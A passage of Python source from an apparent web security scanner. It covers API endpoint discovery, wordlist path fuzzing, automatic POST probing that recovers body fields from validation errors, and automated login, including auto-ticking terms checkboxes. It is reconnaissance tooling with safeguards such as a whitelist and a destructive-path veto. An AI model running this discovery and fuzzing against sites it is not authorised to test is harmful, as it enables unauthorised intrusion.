        """Serialise a field dict as (body_string, content_type) for the chosen
        body encoding — 'form' = application/x-www-form-urlencoded, else JSON."""
        if fmt == 'form':
            return (urlencode({k: ('' if v is None else v)
                               for k, v in fields.items()}),
                    'application/x-www-form-urlencoded')
        return (json.dumps(fields), 'application/json')

    @staticmethod
    def _response_looks_error(node: SiteNode) -> bool:
        """True if the captured response is (or embeds) an error — an HTTP 4xx/5xx,
        or a JSON envelope carrying a 4xx/5xx code (e.g. an HTTP 200 whose body is
        {"code":400,…}, as some frameworks do)."""
        if (node.resp_status or 0) >= 400:
            return True
        return bool(re.search(r'"(?:code|status)"\s*:\s*[45]\d\d',
                              (node.resp_body or '')[:2000]))

    def _probe_post_body(self, node: SiteNode, method, fmt, base):
        """Send the read POST with body encoding `fmt`, then refine the body across
        validation-error rounds: the server's rejection names the fields it wants,
        which we add (pagination fields get sensible generic defaults, the rest
        blank) and re-send, up to the round cap. Returns (clean, recovered): did
        the final response come back non-error, and how many fields were learned.
        Each send is still a read (allowlisted path) — never destructive."""
        seeded = dict(base)
        if seeded:
            body, ct = self._encode_body(seeded, fmt)
        else:
            body, ct = (('' if fmt == 'form' else '{}'),
                        ('application/x-www-form-urlencoded' if fmt == 'form'
                         else 'application/json'))
        self._replay(node, method, node.url, body=body, ct=ct)
        recovered = 0
        for _ in range(self._MAX_BODY_ROUNDS):
            fields = self._fields_from_validation(node.resp_body or '',
                                                  node.resp_status)
            added = []
            for f in fields:
                ph = self._placeholder_for(f)
                if f not in seeded:
                    seeded[f] = ph
                    added.append(f)
                elif seeded[f] in ('', None) and ph != '':
                    seeded[f] = ph        # upgrade a blank value to a typed default
                    added.append(f)
            if not added:                 # server stopped naming new/blank fields
                break
            recovered += len(added)
            node.post_params = {f: [str(v)] for f, v in seeded.items()}
            self._log(f'  POST body fields ({fmt}) from validation error: '
                      + ', '.join(seeded))
            body, ct = self._encode_body(seeded, fmt)
            self._replay(node, method, node.url, body=body, ct=ct)
        return (not self._response_looks_error(node)), recovered

    def _enrich_post_body(self, node: SiteNode, method, fmt):
        """After a search/list POST is confirmed working (a clean response), add
        its *optional* body fields — recovered from source request-models that
        include every confirmed field — so the node/Repeater shows the full
        parameter surface (orderBy, order, filters, search term) the server never
        names in a required-field-only error. The extras are verified with one
        send: if they're accepted they're kept; if they break the request the
        working body is restored and they're still surfaced as candidates. Still a
        read on an allowlisted path — never destructive."""
        # Anchor on the body we just sent successfully — parse it back so values
        # keep their real JSON types (page=1, not "1", which a typed backend would
        # reject). Form bodies are all-string, so fall back to post_params there.
        working = {}
        try:
            d = json.loads(node.req_body or '')
            if isinstance(d, dict):
                working = d
        except Exception:
            working = {k: (v[0] if isinstance(v, list) and v else '')
                       for k, v in (node.post_params or {}).items()}
        if not working:
            return                       # nothing confirmed to anchor a model to
        want = {k.lower() for k in working}
        extras: dict = {}
        for keys in self._page_models:
            if want <= {k.lower() for k in keys}:
                for k in keys:
                    if (k.lower() not in want
                            and k.lower() not in {e.lower() for e in extras}):
                        extras[k] = self._placeholder_for(k)
        if not extras:
            return
        enriched = dict(working)
        enriched.update(extras)
        self._log('  POST optional fields from source model: '
                  + ', '.join(extras))
        body, ct = self._encode_body(enriched, fmt)
        self._replay(node, method, node.url, body=body, ct=ct)
        if self._response_looks_error(node):
            # Extras rejected (strict unknown-field handling) — restore the working
            # 200 response, but keep the optional names visible for manual testing.
            wbody, wct = self._encode_body(working, fmt)
            self._replay(node, method, node.url, body=wbody, ct=wct)
            node.post_params = {**{k: [str(v)] for k, v in working.items()},
                                **{k: [''] for k in extras}}
        else:
            node.post_params = {k: [str(v)] for k, v in enriched.items()}

    def _maybe_probe_post(self, node: SiteNode):
        """Auto-probe a discovered, not-yet-sent non-GET endpoint to capture its
        real response and recover its parameters (required fields via validation
        errors, optional fields like orderBy via source models) — using the
        best-known body, or an empty body to make the server name its fields.

        Sent only when the path is permitted by the safe-path whitelist (default:
        read/query verbs) AND is not destructive (delete/exec/credential ops/
        DELETE method are always withheld for the Repeater). Any non-GET method
        qualifies. Each auto-probed path is recorded on the live whitelist."""
        if node.probe_state != 'unsent':
            return
        method = (node.req_method or 'POST').upper()
        if method in ('GET', 'HEAD'):
            return                       # GET endpoints are handled elsewhere
        # An exact (non-glob) whitelist entry the user typed overrides the
        # destructive veto — a deliberate opt-in to auto-send that path.
        explicit = (self.whitelist is not None
                    and self.whitelist.is_explicit(node.url))
        if self._is_destructive_send(node.url, method) and not explicit:
            self._log(f'  probe withheld (destructive path/method): '
                      f'{method} {node.url[:60]}')
            return
        if not self._interaction_allowed(node.url):
            self._log(f'  probe withheld (not in safe-path whitelist): '
                      f'{method} {node.url[:60]}')
            return
        if explicit:
            self._log(f'  probe (whitelist override): {method} {node.url[:60]}')
        # Record this path on the live whitelist (auditable; counts as allowed).
        if self.whitelist is not None and self.whitelist.add(node.url):
            self._log(f'  whitelist += {self.whitelist._path_of(node.url)[:60]}')
        self._log(f'  probe (read): {method} {node.url[:60]}')
        ct = (node.content_type or '').lower()
        # multipart (file uploads) — never synthesise a body; just capture one
        # response with whatever we already have, and don't run recovery.
        if 'multipart' in ct:
            self._replay(node, method, node.url,
                         body=node.req_body or '', ct=node.content_type or '')
            return
        # Pre-known body fields: a JSON template (spec/source) or recovered params.
        base = {}
        try:
            d = json.loads(node.req_body or '')
            if isinstance(d, dict):
                base.update(d)
        except Exception:
            pass
        for k, v in (node.post_params or {}).items():
            base.setdefault(k, v[0] if isinstance(v, list) and v else '')
        # Try the declared body encoding first; fall back to the other only when an
        # attempt is rejected with nothing learned (a JSON-only loop would miss a
        # form-encoded endpoint, and vice-versa). The validation-error parser reads
        # the *response*, so it's encoding-agnostic. Dynamic and non-destructive.
        encodings = (('form', 'json') if 'x-www-form-urlencoded' in ct
                     else ('json', 'form'))
        win_fmt, win_clean = None, False
        for fmt in encodings:
            clean, recovered = self._probe_post_body(node, method, fmt, base)
            if clean or recovered:
                win_fmt, win_clean = fmt, clean
                break                    # got data, or learned the fields → done
        # With a confirmed working body, enrich it with the endpoint's optional
        # fields recovered from source request-models (orderBy/order/filters).
        if win_clean and win_fmt:
            self._enrich_post_body(node, method, win_fmt)

    @staticmethod
    def _mark_redirect(node: SiteNode):
        """If the captured response was a 3xx, classify the node as 'redirect'."""
        if 300 <= (node.resp_status or 0) < 400:
            node.node_type = 'redirect'

    @staticmethod
    def _sig(body: str) -> str:
        """Stable signature of an HTML body (whitespace- & nonce-insensitive)."""
        if not body:
            return ''
        b = re.sub(r'nonce="[^"]*"', '', body)
        b = re.sub(r'\s+', ' ', b).strip()
        return hashlib.md5(b.encode('utf-8', 'ignore')).hexdigest()

    @staticmethod
    def _is_noise(url: str) -> bool:
        """True if the URL matches a known-noise path (realtime transports,
        dev-server churn) that should never be recorded as an endpoint."""
        low = url.lower()
        return any(p in low for p in NOISE_PATHS)

    def _is_spa_fallback(self, node: SiteNode) -> bool:
        """True if a response looks like the app's HTML shell / a route fallback
        rather than a real data endpoint (generic across frameworks)."""
        ct = (node.content_type or '').lower()
        if ct.startswith('text/html') or ct.startswith('application/xhtml'):
            return True
        if self.shell_hash and node.resp_body and \
                self._sig(node.resp_body) == self.shell_hash:
            return True
        return False

    # Response Content-Types that mark a node as a downloadable file / media
    # asset rather than a real (data-returning) API. Used to relabel an 'endpoint'
    # node whose URL looked dynamic (a /<uuid> or /<id> resource path) but
    # whose response is actually a binary blob — e.g. /api/v1/files/<uuid>
    # serving an image. The 'endpoint' label is reserved for endpoints that return
    # data (JSON/XML/text); everything binary is a 'file'.
    _ASSET_CT = ('image/', 'video/', 'audio/', 'font/', 'model/',
                 'application/octet-stream', 'application/pdf',
                 'application/zip', 'application/gzip', 'application/x-gzip',
                 'application/x-tar', 'application/x-7z-compressed',
                 'application/x-rar', 'application/x-bzip',
                 'application/vnd.ms-', 'application/vnd.openxmlformats',
                 'application/msword', 'application/x-font')

    @classmethod
    def _is_asset_response(cls, node: SiteNode) -> bool:
        """True when the captured response is a binary/media file (image, video,
        font, archive, document, …) rather than a data API. The Content-Type is
        authoritative: a /files/<uuid> path can look like a REST resource yet
        actually serve an image, so the URL alone can't decide this."""
        ct = (node.content_type or '').split(';', 1)[0].strip().lower()
        return bool(ct) and ct.startswith(cls._ASSET_CT)

    def _discover_assets(self, node: SiteNode, domain, observed=None):
        """Find JS bundles + API endpoints for the current page and emit them as
        'script' / 'endpoint' nodes linked to the page (APIs found inside a bundle
        are linked to that bundle).

        Sources, richest first: requests captured from live traffic via the
        fetch/XHR instrumentation (real method + body params), then XHR/fetch
        URLs from the Performance API, then endpoints merely guessed from
        HTML/JS text. The first two are trusted; guessed ones are kept only if
        their response looks like real data — not the HTML shell — which filters
        out catch-all route fallbacks generically."""
        page_url = node.url
        if observed is None:
            observed = self._collect_api_calls(domain)
        # Learn the API base prefix from real traffic (e.g. '/api/v1') so source
        # paths written relative to it can be relocated to their true URL later.
        self._learn_api_bases_from_observed(observed)

        # norm(url) -> record. 'rec' carries everything we know about the call.
        api_src: dict = {}

        def add(url, parent, obs, method='GET', params=None, body='', ct='',
                status=None, resp_body='', req_headers=None, resp_headers=None):
            """Record a candidate endpoint in api_src, keyed by normalised URL.
            Skips noise and static assets; an observed call upgrades a previously
            inferred one (and a known method/params upgrades an assumed GET)."""
            if self._is_noise(url):
                return
            # A static asset (CSS/JS/image/font/…) is never an API node — those
            # belong to 'script'/'file'. Data formats (.json/.xml) are NOT in
            # _ASSET_EXT, so real data endpoints still pass.
            if (urlparse(url).path or '').lower().endswith(self._ASSET_EXT):
                return
            key = self._norm(url)
            new = {'url': url, 'parent': parent, 'observed': obs,
                   'method': method, 'params': params or {}, 'body': body, 'ct': ct,
                   'status': status, 'resp_body': resp_body,
                   'req_headers': req_headers or {}, 'resp_headers': resp_headers or {}}
            cur = api_src.get(key)
            if cur is None:
                api_src[key] = new
            else:
                # Upgrade with better information: observed beats inferred, and a
                # known method/params beats an assumed GET with none.
                if obs and not cur['observed']:
                    cur.update(new)
                elif obs == cur['observed'] and params and not cur['params']:
                    cur.update({'method': method, 'params': params,
                                'body': body, 'ct': ct})

        # 1) Instrumented live traffic — real method + body params, plus the
        #    exact request/response headers and the response the browser received.
        for o in observed:
            add(o['url'], page_url, True, o['method'], o['params'],
                o.get('body', ''), o.get('ct', ''),
                o.get('status'), o.get('resp_body', ''),
                o.get('req_headers'), o.get('resp_headers'))
        # 2) Performance API — URLs only (method assumed GET).
        for ep in self._collect_api_perf(domain):
            add(ep, page_url, True)
        # 3) Inferred from the page text.
        try:
            html = self.driver.page_source
        except Exception:
            html = ''
        for ep, method in self._endpoints_from_text(html, page_url, domain).items():
            add(ep, page_url, False, method=method)
        # 3b) HTML forms are first-class data-out: promote each non-GET form's
        #    action into a POST endpoint with its field names as params (A). The
        #    request is NEVER auto-sent (POST isn't in _SAFE_REPLAY), so this only
        #    surfaces the endpoint — it doesn't trigger the form.
        for f in (node.forms or []):
            fm = (f.get('method') or 'GET').upper()
            action = f.get('action')
            if fm == 'GET' or not action:
                continue
            params = {i.get('name'): '' for i in f.get('inputs', [])
                      if i.get('name')}
            add(action, page_url, False, method=fm, params=params)
        # 4) Mine the bodies of responses we already captured (linked-resource /
        #    HATEOAS URLs inside JSON or XML) — surfaces sibling endpoints
        #    without sending anything new. Resolved against the API's own URL.
        for o in observed:
            body = o.get('resp_body', '') or ''
            if not body:
                continue
            src = o.get('url') or page_url
            for ep, method in self._endpoints_from_text(body, src, domain).items():
                add(ep, src, False, method=method)

        # JS bundles (observed resources; also scanned for inferred endpoints)
        for js_url in self._collect_scripts(page_url, domain):
            if not self.running or len(self.assets) >= self.max_assets:
                break
            if self._is_noise(js_url):
                continue
            jnorm = self._norm(js_url)
            if jnorm in self.assets or jnorm in self.visited:
                continue
            self.assets.add(jnorm)
            jnode = SiteNode(js_url, node_type='script', parent_url=page_url)
            jq = urlparse(js_url).query
            if jq:
                jnode.get_params = parse_qs(jq, keep_blank_values=True)
            self._capture_http(jnode, js_url)
            self._mark_redirect(jnode)
            eps = self._endpoints_from_text(jnode.resp_body or '', page_url,
                                            domain, from_source=True)
            # Source maps: if this bundle ships one, the original (unminified)
            # source recovers far more endpoints AND readable `.post(url, {…})`
            # bodies than the minified bundle. Fetching a .map is a plain GET —
            # non-destructive. Skipped in Stealth and bounded per scan.
            src = self._fetch_source_map(js_url, jnode.resp_body or '')
            if src:
                meps = self._endpoints_from_text(src, page_url, domain,
                                                 from_source=True)
                for ep, method in meps.items():
                    eps.setdefault(ep, method)
                for ep, names in self._post_bodies_from_source(
                        src, page_url, domain).items():
                    add(ep, js_url, False, method='POST',
                        params={n: '' for n in names})
                    # Carry the recovered body field names onto the relative path
                    # too, so the post-crawl base relocation seeds the same body
                    # at the endpoint's real URL (e.g. under '/api/v1').
                    rp = urlparse(ep).path
                    if rp.startswith('/') and not rp.startswith('//'):
                        rec = self._mined_rel.setdefault(
                            rp, {'method': 'POST', 'params': {}})
                        rec['method'] = 'POST'
                        rec['params'].update({n: '' for n in names})
            jnode.links = sorted(eps)
            jnode.scanned = True
            self._log(f'  JS bundle: {js_url[:60]}  ({len(eps)} endpoint hints'
                      + ('  +sourcemap' if src else '') + ')')
            if self.on_node:
                self.on_node(jnode)
            for ep, method in eps.items():
                add(ep, js_url, False, method=method)

        # API endpoints. Processed as a worklist (not a flat loop) so that data
        # we fetch can reveal more endpoints: when a freshly captured response is
        # real JSON/XML, its body is mined for linked/sibling endpoints (HATEOAS,
        # embedded resource URLs) and they're folded back in. Bounded by
        # max_assets and a mining-depth cap so it can't run away, and SPA-shell /
        # asset responses are never mined.
        MAX_MINE_DEPTH = 2
        pending = deque(api_src.keys())
        while pending:
            if not self.running or len(self.assets) >= self.max_assets:
                break
            rec = api_src.get(pending.popleft())
            if rec is None:
                continue
            enorm = self._norm(rec['url'])
            if enorm in self.assets or enorm in self.visited:
                continue
            self.assets.add(enorm)
            anode = SiteNode(rec['url'], node_type='endpoint', parent_url=rec['parent'])
            self._capture_observed(anode, rec)
            # Authenticated scan: an API endpoint behind auth (401/403) prompts
            # for a credential once per host, then re-captures authenticated.
            if self._maybe_prompt_auth(anode, rec['url']):
                self._capture_observed(anode, rec)
            # Auto-probe a not-yet-sent non-GET endpoint (allowlisted + non-
            # destructive) to capture its response and recover its parameters.
            self._maybe_probe_post(anode)
            # Endpoints we actually observed are ground truth — always kept.
            # Guessed ones are dropped if they just return the HTML shell (the
            # catch-all route), detected automatically.
            if not rec['observed'] and self._is_spa_fallback(anode):
                continue
            self._mark_redirect(anode)
            # Authoritative reclassify: a dynamic-looking URL (/files/<uuid>)
            # that actually serves a binary blob (image/video/font/pdf/…) is a
            # file download, not an API — decided by the response Content-Type.
            if anode.node_type == 'endpoint' and self._is_asset_response(anode):
                anode.node_type = 'file'
            anode.scanned = True
            mp = f"{rec['method']} " if rec['method'] != 'GET' else ''
            label = 'File' if anode.node_type == 'file' else 'API'
            self._log(f'  {label} endpoint: {mp}{rec["url"][:64]}')
            if self.on_node:
                self.on_node(anode)
            # Recursively mine real data responses (JSON/XML) for more endpoints.
            # Only genuine API nodes with a non-shell body, bounded by depth.
            depth = rec.get('depth', 0)
            if (anode.node_type == 'endpoint' and depth < MAX_MINE_DEPTH
                    and anode.resp_body and not self._is_spa_fallback(anode)):
                known = set(api_src)
                for ep, method in self._endpoints_from_text(
                        anode.resp_body, anode.url, domain).items():
                    add(ep, anode.url, False, method=method)
                for nk in set(api_src) - known:
                    api_src[nk]['depth'] = depth + 1
                    pending.append(nk)

    # Cap on active API-probe requests per host so Aggressive wordlist fuzzing
    # can't balloon into thousands of requests against a single host.
    _MAX_PROBES = 1200
    # Max validation-error → re-send rounds when recovering a POST body, so a
    # server that keeps naming new required fields can't loop indefinitely.
    _MAX_BODY_ROUNDS = 4

    def _probe_get(self, url, parent_url):
        """Send one safe GET probe for an endpoint-discovery candidate. If the
        response proves the path exists, create + emit a node and return it;
        otherwise return None. Drops only 404/410/501 and the SPA HTML shell
        (catch-all routes). 401/403 and every other status are KEPT — the status
        and body are exactly what the user wants to see and analyse."""
        norm = self._norm(url)
        if norm in self.visited or norm in self.assets:
            return None
        self.assets.add(norm)
        node = SiteNode(url, node_type='endpoint', parent_url=parent_url)
        # GET is only nominally safe: a path naming a session-kill / job-trigger
        # / credential side effect is surfaced un-sent rather than requested.
        if self._is_unsafe_get(url):
            self._seed_unsafe_get(node)
            node.scanned = True
            self._log(f'  Probe seeded (unsafe GET, not sent): {url[:64]}')
            if self.on_node:
                self.on_node(node)
            return node
        self._capture_http(node, url)
        # Authenticated scan: a probe that hits an auth wall prompts once per
        # host, then re-probes authenticated so the kept node reflects real access.
        if self._maybe_prompt_auth(node, url):
            self._capture_http(node, url)
        st = node.resp_status
        if st is None:
            return None
        if st in (404, 410, 501):
            return None
        if st == 200 and self._is_spa_fallback(node):
            return None
        self._mark_redirect(node)
        # A dynamic-looking path that actually serves a binary blob (image/
        # font/pdf/…) is a file download, not an API — decided by Content-Type.
        if node.node_type == 'endpoint' and self._is_asset_response(node):
            node.node_type = 'file'
        node.scanned = True
        self._log(f'  Probe hit [{st}]: {url[:64]}')
        if self.on_node:
            self.on_node(node)
        return node

    def _emit_spec_endpoint(self, rec):
        """Emit an endpoint recovered from an OpenAPI/Swagger spec. GET endpoints
        are confirmed with a safe GET probe; POST/PUT/PATCH/DELETE are seeded as
        'unsent' nodes carrying the method + body params + a JSON body template
        so the user can edit and fire them from the Repeater — nothing with a
        side effect is ever sent here. De-duplicated against already-seen URLs."""
        url = rec['url']
        norm = self._norm(url)
        if (norm in self.visited or norm in self.assets
                or len(self.assets) >= self.max_assets or not self.running):
            return None
        self.assets.add(norm)
        node = SiteNode(url, node_type='endpoint', parent_url=rec['parent'])
        obs_rec = {
            'url': url, 'parent': rec['parent'], 'observed': False,
            'method': rec['method'], 'params': rec.get('params') or {},
            'body': rec.get('body', ''), 'ct': rec.get('ct', ''),
            'status': None, 'resp_body': '',
            'req_headers': ({'Content-Type': rec['ct']} if rec.get('ct') else {}),
            'resp_headers': {},
        }
        self._capture_observed(node, obs_rec)
        # Auth-gated host: prompt once, then re-capture so a GET reflects real
        # access (a seeded POST is unaffected — it isn't sent).
        if self._maybe_prompt_auth(node, url):
            self._capture_observed(node, obs_rec)
        # Auto-probe the seeded non-GET endpoint (with its spec body) to capture
        # a real response and recover params — allowlisted + non-destructive only.
        self._maybe_probe_post(node)
        # A GET that just returns the SPA shell is a catch-all, not a real
        # endpoint — drop it (POST seeds have no response, so this never trips).
        if rec['method'] in self._SAFE_REPLAY and self._is_spa_fallback(node):
            self.assets.discard(norm)
            return None
        self._mark_redirect(node)
        if node.node_type == 'endpoint' and self._is_asset_response(node):
            node.node_type = 'file'
        node.scanned = True
        mp = f"{rec['method']} " if rec['method'] != 'GET' else ''
        np = len(rec.get('params') or {})
        self._log(f'  Spec endpoint: {mp}{url[:60]}'
                  + (f'  ({np} body param{"s" if np != 1 else ""})' if np else ''))
        if self.on_node:
            self.on_node(node)
        return node

    def _probe_api_endpoints(self, domain, parent_url):
        """Active, unauthenticated endpoint discovery, run once per host after the
        crawl (so the SPA shell signature is known). Normal: high-signal spec /
        discovery / well-known paths only. Aggressive (or any mode with the Auto
        Fuzzer on): + a comprehensive path wordlist, expanded ONLY under API
        bases that exist (a 404 base is skipped) to keep volume and WAF exposure
        bounded. Skipped in Stealth unless the Auto Fuzzer is on (gated by the
        caller). A swagger/openapi hit is mined for its full endpoint list."""
        if not self.running or not REQUESTS_AVAILABLE:
            return
        base_root = f'{urlparse(parent_url).scheme or "https"}://{domain}/'
        probes = 0

        def fire(path):
            """Probe one path under the host root, honouring the probe budget,
            asset cap and stealth throttle. Returns the created node or None."""
            nonlocal probes
            if (not self.running or probes >= self._MAX_PROBES
                    or len(self.assets) >= self.max_assets):
                return None
            probes += 1
            self._throttle()
            return self._probe_get(urljoin(base_root, str(path).lstrip('/')),
                                   parent_url)

        self._log(f'API probe ({self.mode}): {domain}')
        # 1) High-signal well-known / spec / discovery paths (Normal + Aggressive).
        for path in API_PROBE_WELLKNOWN:
            node = fire(path)
            # A spec document lists the whole API — mine it and probe each
            # same-host endpoint it names (one level, no recursion).
            if node is not None and node.node_type == 'endpoint' and node.resp_body:
                low = node.url.lower()
                ct = (node.content_type or '').lower()
                if ('json' in ct or 'yaml' in ct or 'xml' in ct
                        or any(s in low for s in ('swagger', 'openapi',
                                                  'api-docs', 'schema'))):
                    # Structured parse first: recovers each operation's METHOD and
                    # request-body schema (seeds a fuzzable POST body, nothing
                    # sent). Then the URL-regex pass fills in anything it missed.
                    for rec in self._parse_openapi_spec(
                            node.resp_body, node.url, domain):
                        if urlparse(rec['url']).netloc == domain:
                            self._emit_spec_endpoint(rec)
                    for ep in self._endpoints_from_text(
                            node.resp_body, node.url, domain):
                        if urlparse(ep).netloc == domain:
                            fire(ep)
        # 2) Wordlist fuzzing — Aggressive, or any intensity in the Fuzzing scan
        #    type — under bases that actually exist. Discovers directories/
        #    endpoints that nothing links to (e.g. /images, /admin). Paced by the
        #    mode's throttle (slow in Stealth), bounded by probe budget/asset cap.
        if self.scan_type == 'fuzzing' or self.mode == 'Aggressive':
            self._log(f'Fuzz ({self.mode}): path wordlist '
                      f'({len(API_PROBE_WORDLIST)} words)')
            live_bases = []
            for b in API_PROBE_BASES:
                if b == '/':
                    live_bases.append(b)
                    continue
                if fire(b) is not None:
                    live_bases.append(b)
            for b in live_bases:
                for word in API_PROBE_WORDLIST:
                    if not self.running or probes >= self._MAX_PROBES:
                        break
                    fire(b + word)
        # 3) Relocate source-mined relative API paths under each detected base
        #    (Normal + Aggressive). The frontend writes calls relative to axios's
        #    baseURL (e.g. '/hosts/command/search' under '/api/v1'), so resolving
        #    them against the origin during the crawl missed their real URL. Now
        #    that the base(s) are known (from the baseURL literal AND observed
        #    traffic), re-emit each path under every base. Dynamic — derived from
        #    the site, nothing hardcoded; GET variants that hit the SPA shell/404
        #    are dropped, POST variants are seeded un-sent (only sent if Probe
        #    POST is on, and only for read-allowlisted paths).
        relocated = 0
        for base in sorted(self.api_base_hints):
            for path, info in list(self._mined_rel.items()):
                if not self.running or len(self.assets) >= self.max_assets:
                    break
                low = path.lower()
                if low.startswith(base.lower() + '/') or low == base.lower():
                    continue          # already an absolute path under this base
                full = f'{base_root.rstrip("/")}{base}{path}'
                if urlparse(full).netloc != domain:
                    continue
                method = info['method']
                params = info.get('params') or {}
                # Source-recovered body field names → seed them as the POST body
                # template so the endpoint carries a correct body even before the
                # validation-error round-trip refines it. Nothing is sent here.
                body = (json.dumps({k: '' for k in params})
                        if params and method == 'POST' else '')
                if self._emit_spec_endpoint({
                        'url': full, 'parent': parent_url, 'method': method,
                        'params': params, 'body': body, 'ct': ''}) is not None:
                    relocated += 1
        if self.api_base_hints:
            self._log(f'API base(s) {sorted(self.api_base_hints)}: relocated '
                      f'{relocated} source-mined path(s)')
        self._log(f'API probe done: {domain} — {probes} request(s)')

    def _find_username_field(self, pwd_el=None):
        """Pick the most likely username/email input. With pwd_el given, also uses
        position (a field at/above the password); pwd_el=None is the identifier-
        first case where the password isn't on screen yet."""
        keywords = ('user', 'email', 'login', 'name', 'account',
                    'usuario', 'correo', 'phone', 'tel',
                    'user', '用户', '账号', '帳號', '邮箱', '郵箱', '手机',
                    'utilisateur', 'benutzer', 'nome', 'usuário')
        try:
            els = self.driver.find_elements(
                By.CSS_SELECTOR,
                'input[type="text"], input[type="email"], input[type="tel"], '
                'input:not([type])')
        except Exception:
            els = []
        candidates = []
        for e in els:
            try:
                if e.is_displayed():
                    candidates.append(e)
            except Exception:
                continue
        if not candidates:
            return None
        # Prefer a field whose attributes hint at a username/email
        for e in candidates:
            attrs = ' '.join(filter(None, [
                e.get_attribute('name'), e.get_attribute('id'),
                e.get_attribute('placeholder'),
                e.get_attribute('autocomplete')])).lower()
            if any(k in attrs for k in keywords):
                return e
        # Otherwise the last visible field positioned at/above the password
        # (skipped in the identifier-first flow where there's no password yet).
        if pwd_el is not None:
            try:
                py = pwd_el.location.get('y', 0)
                above = [e for e in candidates if e.location.get('y', 0) <= py]
                if above:
                    return above[-1]
            except Exception:
                pass
        return candidates[0]

    # Multilingual hints for a login/submit button's visible text.
    _SUBMIT_KEYWORDS = (
        'log in', 'login', 'log on', 'sign in', 'signin', 'submit',
        'continue', 'enter', 'access',
        '登录', '登錄', '登入', '登 录', '提交', '进入',
        'entrar', 'iniciar', 'acceder', 'connexion', 'anmelden',
    )

    def _click_submit(self, pwd_el):
        """Click the most likely submit control of the form containing pwd_el.
        Prefers an explicit submit button, then a button whose text reads like
        a login action, then the first visible button — querying each tier
        separately so a stray (e.g. language-switch) button in the same form
        isn't clicked just because it comes first in the DOM."""
        try:
            scope = pwd_el.find_element(By.XPATH, './ancestor::form[1]')
        except Exception:
            scope = self.driver
        # Tier 1: real submit buttons/inputs.
        try:
            for btn in scope.find_elements(
                    By.CSS_SELECTOR,
                    'button[type="submit"], input[type="submit"], '
                    'input[type="image"]'):
                if btn.is_displayed():
                    self.driver.execute_script('arguments[0].click();', btn)
                    return True
        except Exception:
            pass
        # Tier 2: a button whose text/value looks like a login action.
        try:
            btns = scope.find_elements(
                By.CSS_SELECTOR, 'button, [role="button"], a.btn, input[type="button"]')
        except Exception:
            btns = []
        for btn in btns:
            try:
                if not btn.is_displayed():
                    continue
                txt = (btn.text or btn.get_attribute('value') or '').strip().lower()
                if txt and any(k in txt for k in self._SUBMIT_KEYWORDS):
                    self.driver.execute_script('arguments[0].click();', btn)
                    return True
            except Exception:
                continue
        # Tier 3: first visible button in the form.
        for btn in btns:
            try:
                if btn.is_displayed():
                    self.driver.execute_script('arguments[0].click();', btn)
                    return True
            except Exception:
                continue
        return False

    # Multilingual hints for "I agree to the terms / license" style checkboxes
    # that gate many login forms (e.g. a community-license consent box).
    _AGREE_KEYWORDS = (
        'agree', 'terms', 'consent', 'license', 'licence', 'accept',
        'policy', 'privacy', 'tos', 'condition', 'acknowledge', 'eula',
        'agreement', 'i have read', 'read and',
        '同意', '协议', '協議', '许可', '許可', '隐私', '隱私', '条款', '條款',
        'acuerdo', 'términos', 'terminos', 'aceptar',
        'accepter', 'conditions', 'einverstanden', 'zustimmen',
    )

    def _accept_agreements(self):
        """Tick any unchecked "I agree to the terms/license" checkboxes that
        commonly gate a login form. Generic across frameworks: matches by the
        checkbox's own attributes and its surrounding label text, and clicks the
        wrapping <label> when present so Vue/React component checkboxes
        (Element Plus, Ant Design, etc.) toggle correctly rather than the
        non-interactive hidden native input. Returns the number ticked."""
        try:
            boxes = self.driver.find_elements(
                By.CSS_SELECTOR, 'input[type="checkbox"]')
        except Exception:
            boxes = []
        clicked = 0
        for cb in boxes:
            try:
                if cb.is_selected():
                    continue
                attrs = ' '.join(filter(None, [
                    cb.get_attribute('name'), cb.get_attribute('id'),
                    cb.get_attribute('aria-label'),
                    cb.get_attribute('value')]))
                # Text of the nearest label / wrapper gives the human-readable
                # consent wording even when attributes are opaque.
                try:
                    surround = self.driver.execute_script(
                        'var e=arguments[0];'
                        'var l=e.closest("label");'
                        'if(!l && e.id){l=document.querySelector('
                        '  "label[for=\\""+e.id+"\\"]");}'
                        'if(!l){l=e.closest("[class*=checkbox]")||'
                        '  e.parentElement;}'
                        'return l?l.textContent:"";', cb) or ''
                except Exception:
                    surround = ''
                blob = (attrs + ' ' + surround).lower()
                if not any(k in blob for k in self._AGREE_KEYWORDS):
                    continue
                # Prefer clicking the wrapping label (component checkboxes hide
                # the real input); fall back to the input itself.
                target = cb
                try:
                    lab = cb.find_element(
                        By.XPATH,
                        './ancestor::label[1] | '
                        './ancestor::*[contains(@class,"checkbox")][1]')
                    if lab is not None:
                        target = lab
                except Exception:
                    pass
                self.driver.execute_script('arguments[0].click();', target)
                if not cb.is_selected():
                    # Component didn't latch via the label — toggle the input.
                    self.driver.execute_script('arguments[0].click();', cb)
                clicked += 1
                self._log('Accepted a terms/agreement checkbox before login.')
            except Exception:
                continue
        return clicked

    # Bound on how many active login interactions (reveal-click, identifier-first
    # 'Next', credential submit) one scan performs — caps credential submits (so a
    # wrong password can't trigger lockout) and limits disruption on no-login
    # sites. Reset to fresh on a successful login so a later session-drop can
    # re-authenticate.
    _LOGIN_MAX_TRIES = 6

    # Visible-text / href hints for a control that REVEALS the login form (a
    # header 'Log in' link or a modal trigger), and for a 'Next/Continue' button
    # in an identifier-first (username → next → password) flow.
    _LOGIN_TRIGGER_KEYWORDS = (
        'log in', 'login', 'log-in', 'sign in', 'signin', 'sign-in', 'log on',
        'entrar', 'iniciar sesión', 'iniciar sesion', 'acceder', 'accedi',
        'connexion', 'anmelden', 'my account', 'account',
        '登录', '登入', '登錄', '로그인', 'ログイン',
    )
    _NEXT_KEYWORDS = (
        'next', 'continue', 'proceed', 'siguiente', 'continuar', 'suivant',
        'weiter', 'avanti', 'próximo', 'proximo', '下一步', '继续', '繼續',
        '次へ', '다음',
    )

    def _visible_password_field(self):
        """First visible password input, or None."""
        try:
            for e in self.driver.find_elements(
                    By.CSS_SELECTOR, 'input[type="password"]'):
                if e.is_displayed():
                    return e
        except Exception:
            pass
        return None

    def _reveal_login(self) -> bool:
        """No password field on screen yet — click a control/link that looks like
        it opens the login form (a 'Log in' header link or a modal trigger), so the
        form appears. Returns True if something was clicked."""
        try:
            els = self.driver.find_elements(
                By.CSS_SELECTOR,
                'a, button, [role="button"], input[type="button"]')
        except Exception:
            return False
        for el in els:
            try:
                if not el.is_displayed():
                    continue
                href = (el.get_attribute('href') or '').lower()
                blob = ' '.join(filter(None, [
                    (el.text or '').strip().lower(), href,
                    (el.get_attribute('aria-label') or '').lower(),
                    (el.get_attribute('title') or '').lower()]))
                if not blob:
                    continue
